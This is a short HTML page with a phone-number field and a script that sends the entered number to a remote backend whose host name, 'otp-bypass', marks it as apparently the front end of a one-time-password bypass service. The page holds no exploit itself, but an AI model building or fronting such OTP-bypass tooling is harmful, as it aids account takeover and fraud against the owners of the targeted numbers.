<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Send Phone Number</title>
</head>
<body>

  <h2>Enter Mobile Number</h2>

  <input
    type="text"
    id="phone"
    placeholder="+91XXXXXXXXXX"
  />

  <br><br>

  <button onclick="sendNumber()">Send</button>

  <p id="status"></p>

  <script>
    function sendNumber() {
      const phone = document.getElementById("phone").value;
      const status = document.getElementById("status");

      if (!phone) {
        status.innerText = "Please enter a number";
        return;
      }

      status.innerText = "Sending...";

      fetch("https://otp-bypass-1.onrender.com/submit-number", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ phone })
      })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          status.innerText = "Number received by backend ✅";
        } else {
          status.innerText = "Backend error ❌";
        }
      })
      .catch(err => {
        console.error(err);
        status.innerText = "Network error ❌";
      });
    }
  </script>

</body>
</html>
